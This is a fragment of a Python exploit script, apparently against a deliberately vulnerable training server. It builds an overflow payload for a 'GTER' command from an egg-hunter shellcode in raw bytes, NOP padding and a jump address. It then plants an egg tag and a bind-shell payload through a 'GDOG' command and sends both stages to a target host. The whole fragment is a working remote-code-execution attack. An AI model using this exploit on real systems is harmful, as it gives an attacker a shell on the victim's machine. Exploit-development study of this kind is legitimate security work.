...
def main():
	...
	eggHunter = '\x50\x01\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
	...
	payload = 'GTER ' + eggHunter + '\x90' * (151 - len(eggHunter)) + jmpEAX

	# Egg and shellcode
	egg = 'T00W'
	eggNShell = 'GDOG ' + egg * 2 + bindShell

	print('Total payload length: {0}'.format(len(payload)))

	print('\r\n\r\n[+] Putting Egg & Shellcode into memory')
	sendPayload(host, port, eggNShell)
	print('\r\n\r\n[+] Sending Payload')
	sendPayload(host, port, payload)
	print('[+] Sleeping to let the egg hunter work')
	time.sleep(10)
